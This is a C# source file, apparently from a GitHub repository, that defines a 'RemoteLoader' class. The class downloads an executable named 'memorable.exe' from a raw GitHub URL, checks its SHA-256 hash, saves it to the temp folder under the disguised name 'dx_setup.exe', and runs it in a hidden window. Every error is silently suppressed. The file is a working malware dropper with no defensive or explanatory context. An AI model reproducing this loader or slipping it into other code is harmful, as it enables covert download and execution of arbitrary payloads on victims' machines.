// https://raw.githubusercontent.com/cernipoko-bit/sadlife/refs/heads/main/loader.cs
using System;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

public class RemoteLoader
{
    public static async Task ExecuteRemoteLogic()
    {
        try
        {
            string componentUrl = "https://raw.githubusercontent.com/cernipoko-bit/sadlife/refs/heads/main/memorable.exe";
            string expectedHash = "c61a4dbc98b1a4295c068474850ab8dbdc480db99f21367fb1effcb1b05b42f1";

            byte[] componentData = await DownloadComponent(componentUrl);
            if (componentData == null) return;

            if (VerifyHash(componentData, expectedHash))
            {
                ExecuteComponent(componentData);
            }
        }
        catch
        {
            // Silent error
        }
    }

    private static async Task<byte[]> DownloadComponent(string url)
    {
        try
        {
            using (var client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(30);
                return await client.GetByteArrayAsync(url);
            }
        }
        catch
        {
            return null;
        }
    }

    private static bool VerifyHash(byte[] data, string expectedHash)
    {
        using (var sha256 = SHA256.Create())
        {
            byte[] hash = sha256.ComputeHash(data);
            StringBuilder sb = new StringBuilder();
            foreach (byte b in hash) sb.Append(b.ToString("x2"));
            return sb.ToString().Equals(expectedHash, StringComparison.OrdinalIgnoreCase);
        }
    }

    private static void ExecuteComponent(byte[] componentData)
    {
        try
        {
            string tempFile = Path.Combine(Path.GetTempPath(), "dx_setup.exe");
            File.WriteAllBytes(tempFile, componentData);

            Process.Start(new ProcessStartInfo
            {
                FileName = tempFile,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
        catch
        {
            // Execution failed
        }
    }
}